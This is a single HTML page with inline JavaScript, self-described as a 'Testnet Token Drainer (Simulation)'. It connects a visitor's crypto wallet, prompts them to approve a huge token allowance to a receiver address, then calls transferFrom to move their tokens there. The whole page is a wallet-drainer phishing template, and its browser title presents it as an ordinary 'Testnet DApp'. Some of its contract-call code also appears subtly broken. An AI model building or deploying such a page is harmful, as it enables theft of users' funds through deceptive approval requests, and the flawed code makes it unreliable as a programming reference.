<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WalletConnect v2 Testnet DApp</title>
</head>
<body>
  <h1>WalletConnect v2 Testnet Token Drainer (Simulation)</h1>
  <button id="connect">Connect Wallet</button>
  <button id="approve">Approve Tokens</button>
  <button id="drain">Transfer Tokens</button>

  <script type="module">
    import { EthereumClient, w3mConnectors, w3mProvider } from "https://unpkg.com/@web3modal/ethereum?module";
    import { Web3Modal } from "https://unpkg.com/@web3modal/html?module";
    import { configureChains, createConfig, getAccount, watchAccount } from "https://unpkg.com/@wagmi/core?module";
    import { mainnet, sepolia } from "https://unpkg.com/@wagmi/core/chains?module";
    import { createPublicClient, createWalletClient, http } from "https://unpkg.com/viem?module";

    const projectId = "0ca7babc6d9c2f3eabc56f96b19083fc"; // Free public projectId
    const chains = [sepolia];

    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
    const wagmiConfig = createConfig({ autoConnect: true, connectors: w3mConnectors({ projectId, chains }), publicClient });

    const ethereumClient = new EthereumClient(wagmiConfig, chains);
    const modal = new Web3Modal({ projectId }, ethereumClient);

    let walletClient;
    let userAddress;
    const tokenAddress = "0xYourTestnetTokenAddress"; // Replace with your testnet token (ERC20)
    const drainAddress = "0xReceiverWalletAddress";   // Replace with your receiver wallet (you control it)

    document.getElementById("connect").onclick = async () => {
      await modal.openModal();
    };

    watchAccount({
      onChange(account) {
        userAddress = account.address;
        console.log("Connected address:", userAddress);
      }
    });

    document.getElementById("approve").onclick = async () => {
      walletClient = await ethereumClient.getWalletClient();
      const tx = await walletClient.writeContract({
        address: tokenAddress,
        abi: [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ],
        functionName: "approve",
        args: [drainAddress, BigInt(1000000 * 1e18)]
      });
      console.log("Approval TX:", tx);
    };

    document.getElementById("drain").onclick = async () => {
      walletClient = await ethereumClient.getWalletClient();
      const tx = await walletClient.writeContract({
        address: tokenAddress,
        abi: [
          "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
        ],
        functionName: "transferFrom",
        args: [userAddress, drainAddress, BigInt(1000000 * 1e18)]
      });
      console.log("Draining TX:", tx);
    };
  </script>
</body>
</html>
